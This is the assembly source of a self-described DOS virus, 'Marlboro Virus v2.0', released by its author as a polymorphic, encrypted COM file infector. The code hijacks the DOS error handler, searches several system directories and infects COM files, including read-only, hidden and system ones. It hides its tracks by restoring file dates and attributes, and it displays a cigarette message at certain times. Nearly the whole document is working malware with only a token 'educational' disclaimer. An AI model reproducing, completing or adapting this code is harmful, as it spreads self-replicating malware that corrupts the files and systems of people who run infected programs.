;       This is the Marlboro Virus version 2.0 by LoFreq aka Bfr0vrFl0
;       This is a parasitic (non-overwriting) polymorphic COM infector
;       which, does not cause any file growth if there is enough unused
;       space in the file it infects but if not it will just append
;       to the end.  This virus also has an error handler which means
;       it doesn't give you the "Write Protect Error" and "Abort, Retry
;       , Ignore" errors.  For stealth purposes it restores the original
;       error handler before returning control the the host. This virus
;       draws a cigarette and displays the message "Marlboro Virus v2.0"
;       when an infect file is run if the minute is 50 or larger.
;       It also restores the files original date, time and attributes after
;       infection.  Does it infect readonly, system, and hidden files you ask?
;       Yes it does.  It also changes the original DTA and restores it to the
;       It checks to see if the files are to big to infect if it's going to
;       append to the file.  It also checks to see if the COM file is not
;       a misnamed EXE file or if the file has already been infected.

;       This is an update to my first virus and I'm very proud of it
;       because of all it's features. Don't you think it's pretty good for
;       a first virus?   Comments or Suggestions are appreciated.
;       Lo_Phreak_n_c@hotmail.com

;       Please do not modify the documentation & if you do modify the code
;       Please give credit to it's author:  Lo-Phreak-n-c.

;       DISCLAIMER:  This virus is for educational purposes only.  I will
;       not be held responsible for any of your actions.

                jmp     top                     ;This is dummy code to make it
                db      157                     ;look like it has been infected

top:            call    findoffset
cryptor:        db      00,00
findoffset:     pop     bp                      ;BP will reference our location
                sub     bp,offset cryptor       ;in memory so we can find data
             
                mov     cx,((bottom2-start)/2)+1 ;number of bytes to decrypt
                lea     di,[bp+offset start] ;point to polymorphic part of virus
                lea     bx,[bp+offset cryptor]  ;point to decryp key
                mov     si,di                   ;point di to it too
                
decrypt:        lodsw                           ;load word into ax
                sub     ax,[bx]                 ;subtract cryptor from ax
                stosw                           ;decrypt the word
                loop    decrypt                 ;do next word

start:          push    es                      ;save extra segment
                mov     ax,3524h                ;get int function (int 24h)
                int     21h                     ;do it
                lea     si,[bp+offset oldint]   ;point to oldint buffer
                mov     [si],bx                 ;save original int offset
                inc     si                      ;point to original
                inc     si                      ;int segment address buffer
                mov     [si],es                 ;save original int segment
                pop     es                      ;restore extra segment
                
                mov     ax,2524h           ;interrupt change function (int 24h)
                lea     dx,[bp+offset errorhandler]     ;point to new handler
                int     21h                     ;do it

                lea     si,[bp+offset orig_header] ;point to original header
                mov     di,100h        ;point to 100h where all com files start
                push    di           ;save it, use it for the jump back to 100h
                mov     cx,4h                      ;how many bytes to move
                rep     movsb                      ;move si to di

                lea     dx,[bp+offset newdta]      ;point to newdta
                mov     ah,1ah                     ;set dta
                int     21h                        ;do it
                
                mov     ah,047h                    ;get current dir function
                xor     dl,dl                       ;for current drive
                lea     si,[bp+offset curdir]      ;point to dir buffer
                mov     byte ptr [si],"\"          ;make sure there is a \
                inc     si                         ;point past the \
                int     021h                       ;do it
                
                call    findfiles              ;find files in current directory

                lea     dx,[bp+offset dir1]        ;point to next directory
                mov     ah,3bh                     ;set directory function
                int     21h                        ;do it
                jc      skipdir1
                
                call    findfiles                  ;look for more files
                
skipdir1:       lea     dx,[bp+offset dir2]
                mov     ah,3bh
                int     21h
                jc      skipdir3

                call    findfiles

                lea     dx,[bp+offset dir3]
                mov     ah,3bh
                int     21h
                jc      skipdir3

                call    findfiles

skipdir3:       mov     ah,2ch                     ;get time function
                int     21h                        ;do it
                mov     ch,50                      ;put 50 in ch
                cmp     cl,ch                     ;if minute isn't 50 or larger
                jl      callhost                   ;then skip effect

                lea     dx,[bp+offset message]     ;point to our message
                mov     ah,9h                      ;display string function
                int     21h                        ;do it

                xor     ah,ah                      ;wait for key function
                int     16h                        ;call keyboard interrupt

callhost:       push    ds                         ;save data segment
                lea     si,[bp+offset oldint]      ;point to oldint buffer
                mov     dx,[si]                ;point dx to original int offset
                inc     si                         ;point to original int
                inc     si                         ;segment address
                mov     ds,[si]               ;ds point to original int segment
                mov     ax,2524h         ;change int handler function (int 24h)
                int     21h                        ;do it
                pop     ds                         ;restore data segment

                mov     ah,3bh                     ;set directory function
                lea     dx,[bp+offset curdir]      ;point to current directory
                int     21h                        ;restore current directory

                mov     ah,1ah                     ;set dta function
                mov     dx,80h                     ;point to default dta
                int     21h                        ;set it
                
                xor     ax,ax                       ;zero out all registers
                xor     bx,bx
                xor     cx,cx
                xor     dx,dx
                xor     si,si
                xor     di,di
                xor     bp,bp

                push    ax                         ;push ax which is 0
                popf                               ;zero out all flags
                sti                                ;enable interrupts

                ret                                ;return to 100h

findfiles:      lea     dx,[bp+offset filetype]    ;point to *.com
                mov     cx,00100111b               ;archive & hidden & system
                mov     ah,4eh                     ;find first
findit:         int     21h                        ;do it
                jnc     infect                     ;if file was found infect it

nofile:         ret                                ;do next directory

findnext:       mov     ah,4fh                     ;find next file
                jmp     short findit
                
infect:         lea     dx,[bp+(offset newdta+1eh)] ;point to file in dta
                mov     ax,3d00h                    ;open file read access only
                int     21h                         ;do it

                mov     bx,ax                       ;put filename in bx

                mov     ah,3fh                      ;read from file function
                mov     cx,4h                       ;number of bytes
                lea     dx,[bp+offset orig_header]
                int     21h

                push    ax

                mov     ah,3eh                      ;close file function
                int     21h                         ;close file in bx
                
                pop     ax

                cmp     ax,4h                       ;where all bytes read
                jne     findnext                    ;no so skip
                                                        
                lea     si,[bp+offset check]   ;point to 4th byte in origheader
                mov     dh,byte ptr [si]            ;put it in dh
                lea     si,[bp+offset signature]    ;point to our signature
                cmp     dh,byte ptr [si]            ;check if already infected
                jne     label2                      ;no so keep going

jmp1:           jmp     findnext                    ;booster jump

label2:         lea     si,[bp+offset orig_header] ;1st byte in origheader  
                cmp     byte ptr [si],"M"          ;check if first byte is an M
                je      short:jmp1                 ;If it's an EXE file skip it
                cmp     byte ptr [si],"Z"          ;check if first byte is a Z
                je      short:jmp1                 ;If it's an EXE file skip it

                mov     ah,2ch                     ;get time function
                int     21h                        ;get it
                
                lea     di,[bp+offset cryptor]     ;point to cryptor
                add     [di],dx                    ;set cryptor as time
                
                mov     cx,2                       ;number of times to loop
makesure:       cmp     byte ptr [di],0            ;is the cryptor a 0
                jne     dontadd                    ;no so don't add 1 to it
                add     byte ptr [di],1            ;yes so add 1 to it
dontadd:        inc     di                         ;point to next cryptor 
                loop    makesure                   ;do it again

                lea     dx,[bp+(offset newdta+1eh)]  ;point to file in dta

                mov     ax,4301h                    ;set attributes function
                xor     cx,cx                       ;to none
                int     21h                         ;do it

                mov     ax,3d02h                   ;open file read/write access
                int     21h                         ;do it

                xor     di,di
                mov     cx,[bp+offset newdta+1ah]
findnull:       push    cx
                mov     ah,3fh                      ;read from file function
                mov     cx,1h                       ;number of bytes
                lea     dx,[bp+offset nullfinder]
                int     21h

                pop     cx
                cmp     byte ptr [bp+offset nullfinder],0h
                jne     notnull
                inc     di
                cmp     di,bottom-top+4
                je      foundspace
                jmp     label3
notnull:        xor     di,di
label3:         loop    findnull
                cmp     di,4
                jge     foundspace
                mov     di,4

foundspace:     mov     ax,4201h
                xor     cx,cx
                xor     dx,dx
                int     21h

                sub     di,4
                sub     ax,di

                mov     dx,ax
                sub     dx,(64279-(bottom2-top))
                cmp     ax,dx
                jb      okdoit

                call    restattrib
                jmp     findnext

okdoit:         push    ax
                sub     ax,3
                mov     [bp+offset new_header+1],ax
                pop     dx
                mov     ax,4200h
                int     21h
                
                mov     ah,40h                      ;write to file function
                mov     cx,(start-top)              ;number of bytes
                lea     dx,[bp+offset top]          ;starting from top
                int     21h                        ;write decryptor to the host
                
                lea     si,[bp+offset start]    ;point to start of virus
                mov     cx,((bottom2-start)/2)+1 ;number of bytes to write
encrypt:        push    cx                      ;save cx
                mov     ax,[si]                 ;put first byte in ax
                add     ax,[bp+offset cryptor]  ;add cryptor to al (encrypt al)
                push    ax                      ;save ax
                mov     dx,sp                   ;point to saved ax
                mov     ah,40h                  ;write encrypted byte to file
                mov     cx,2                    ;number of bytes to write
                int     21h                     ;do it
                inc     si                      ;point to next byte
                inc     si                      ;point to next byte
                pop     ax                      ;throw away ax
                pop     cx                      ;restore cx
                loop    encrypt                 ;do next byte

                mov     ax,4200h           ;move file pointer function from SOF
                xor     cx,cx                   ;how many bytes = cx:dx 
                xor     dx,dx
                int     21h

                lea     dx,[bp+offset new_header]  ;point to new header
                mov     cx,4h                      ;how many bytes to write
                mov     ah,40h                     ;write to file function
                int     21h                        ;put a jump to our virus

                mov     cx,[bp+offset newdta+16h]
                mov     dx,[bp+offset newdta+18h]
                mov     ax,5701h
                int     21h

restattrib:     mov     ah,3eh                     ;close file function
                int     21h                        ;close file in bx
                    
                lea     dx,[bp+offset newdta+1eh]

                mov     ax,4302h                       ;set attributes function
                mov     cx,byte ptr[bp+(offset newdta+15h)]   ;to original ones
                dec     ax
                int     21h                        ;do it
                             
                ret                                ;do next directory

errorhandler:   xor     al,al
                iret

;********************** Section for DATA **************************

orig_header     db      0CDh,020h,00h
check           db      00h
                
new_header      db      0e9h,0h,0h
signature       db      157

message         db      0a,0d," _________________"
                db      0a,0d,"(:::(____________()",0a,0d
                db      0a,0d,"Marlboro Virus v2.0",0a,0d,0a,"$"

filetype        db      "*.com",0
dir1            db      "\dos",0
dir2            db      "\windows",0
dir3            db      "command",0

bottom2:

nullfinder      db      00
oldint          db      4 dup (0)
newdta          db      43 dup (0)                  ;newdta buffer
curdir          db      60 dup (0)                  ;curdir buffer

;******************************************************************

bottom:
